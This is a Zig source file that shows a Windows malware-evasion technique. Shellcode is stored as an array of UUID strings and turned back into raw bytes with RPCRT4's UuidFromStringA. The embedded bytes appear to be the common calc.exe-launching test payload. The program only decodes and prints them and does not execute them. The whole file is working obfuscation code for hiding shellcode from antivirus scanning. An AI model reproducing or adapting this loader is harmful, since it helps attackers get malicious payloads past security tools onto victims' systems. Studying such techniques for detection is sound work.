const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

const UUID_ARRAY: [13][]const u8 = [_][]const u8{
    "fce88200-0000-6089-e531-c0648b50308b",
    "520c8b52-148b-7228-0fb7-4a2631ffac3c",
    "617c022c-20c1-cf0d-01c7-e2f252578b52",
    "108b4a3c-8b4c-1178-e348-01d1518b5920",
    "01d38b49-18e3-3a49-8b34-8b01d631ffac",
    "c1cf0d01-c738-e075-f603-7df83b7d2475",
    "e4588b58-2401-d366-8b0c-4b8b581c01d3",
    "8b048b01-d089-4424-245b-5b61595a51ff",
    "e05f5f5a-8b12-eb8d-5d6a-018d85b20000",
    "00506831-8b6f-87ff-d5bb-f0b5a25668a6",
    "95bd9dff-d53c-067c-0a80-fbe07505bb47",
    "13726f6a-0053-ffd5-6361-6c632e657865",
    "00000000-0000-0000-0000-000000000000"
};
const NUMBER_OF_ELEMENTS: usize = 13;

fn uuidDeobfuscation(uuid_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    const rpcrt4 = try windows.kernel32.LoadLibraryA("RPCRT4");
    const UuidFromStringA = @as(
        *const fn([*:0]const u8, [*]u8) callconv(WINAPI) i32,
        @ptrCast(windows.kernel32.GetProcAddress(rpcrt4, "UuidFromStringA").?),
    );

    var buffer = try allocator.alloc(u8, uuid_array.len * 16);
    var offset: usize = 0;

    for (uuid_array) |uuid| {
        const c_uuid = try allocator.dupeZ(u8, uuid);
        defer allocator.free(c_uuid);
        const result = UuidFromStringA(c_uuid.ptr, buffer.ptr + offset);
        if (result != 0) {
            return error.UuidFromStringAFailed;
        }
        offset += 16;
    }

    return buffer;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const shellcode = try uuidDeobfuscation(&UUID_ARRAY, allocator);
    defer allocator.free(shellcode);
    std.debug.print("Decrypted shellcode length: {}\n", .{shellcode.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{shellcode});
}
